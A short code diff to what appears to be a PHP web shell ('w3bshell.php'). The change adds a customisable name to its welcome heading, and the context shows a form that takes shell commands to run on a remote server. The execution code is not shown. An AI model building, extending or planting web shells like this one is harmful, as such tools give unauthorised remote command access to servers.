@@ -9,6 +9,11 @@ die("Access denied!<br>Get away from my remote server! - sincerely Backend ^^");
 
 $backgroundColor = "black"; // Customizeable
 $textColor = "green"; // Customizeable
+
+// Custom name or nickname for welcome message
+
+$name = "lieutenant";
+
 ?>
 <html>
 <head>
@@ -40,7 +45,7 @@ $textColor = "green"; // Customizeable
 
 </head>
 <body>
-<h2>Welcome back lieutenant</h2>
+<h2>Welcome back <?= htmlspecialchars($name) ?></h2>
 <form action="w3bshell.php" method=POST>
 Shell code here:<br><br><input type="text" name="myCommandmentIsThisDO_IT" autocomplete="off">
 <br><div class="output">
